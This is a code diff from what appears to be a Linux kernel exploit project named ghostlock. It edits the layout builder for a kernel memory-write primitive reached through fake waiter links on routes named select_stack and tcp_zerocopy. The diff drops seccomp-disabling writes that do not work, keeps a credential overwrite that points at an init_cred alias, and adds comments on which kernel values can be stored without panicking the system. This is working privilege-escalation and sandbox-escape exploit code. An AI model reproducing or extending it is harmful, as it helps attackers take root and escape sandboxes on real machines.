@@ -63,17 +63,30 @@ namespace ghostlock::memory {
         };
         if (!request || request->mode == WriteMode::Disabled) return layout;
 
-        if (request->mode == WriteMode::SeccompFlags) {
-            /* W3 attempt: clear TIF_SECCOMP only. These values are not valid
-             * kernel pointers; the route returns success but the target is
-             * unchanged (verified: child stays Seccomp: 2). Kept to avoid the
-             * old zero-store panic; the final profile sets w3_attempts=0. */
-            layout.right = ~(1ULL << kernel::TIF_SECCOMP_BIT);
-        } else if (request->mode == WriteMode::SeccompMode) {
-            /* W3 attempt: mode = 0, filter_count = 1. Same value-path
-             * limitation as above. */
-            layout.right = 0x0000000100000000ULL;
-        } else if (request->preserve_child) {
+        /* W3 seccomp writes are NOT SUPPORTED by this primitive and are
+         * rejected here on purpose.
+         *
+         * The select_stack and tcp_zerocopy routes store a fake waiter link
+         * field that the kernel dereferences, so the only storable values are
+         * 0 and a valid mapped kernel pointer. W3 needs
+         * `flags & ~(1 << TIF_SECCOMP_BIT)` (a read-modify-write, or at least a
+         * masked value) and `mode = 0, filter_count = 1` (0x0000000100000000).
+         * Neither is in that value space, so no route can land them.
+         *
+         * Returning the default layout leaves right == 0 with
+         * preserve_child == true, which payload_write_layout_matches_request()
+         * rejects. The route therefore fails loudly instead of reporting a
+         * no-op write as success.
+         *
+         * Do NOT "fix" this by storing 0 here: an 8-byte zero store clears every
+         * TIF_* bit and filter_count, which panics the kernel. See
+         * docs/W3-SECCOMP-ANALYSIS.md. */
+        if (request->mode == WriteMode::SeccompFlags ||
+            request->mode == WriteMode::SeccompMode) {
+            return layout;
+        }
+
+        if (request->preserve_child) {
             layout.right = request->mode == WriteMode::Credential
                                ? init_cred_alias
                                : page_base + 0x100;
@@ -101,6 +114,12 @@ namespace ghostlock::memory {
     int32_t payload_write_layout_matches_request(
         const WriteRequest *request, const PayloadWriteLayout *layout) {
         if (!request || !layout || request->mode == WriteMode::Disabled) return 0;
+        /* Defensive: these value classes are unreachable through the primitive.
+         * Keep them rejected even if a future layout builder changes. */
+        if (request->mode == WriteMode::SeccompFlags ||
+            request->mode == WriteMode::SeccompMode) {
+            return 0;
+        }
         return request->preserve_child ? layout->right != 0 : layout->right == 0;
     }
 
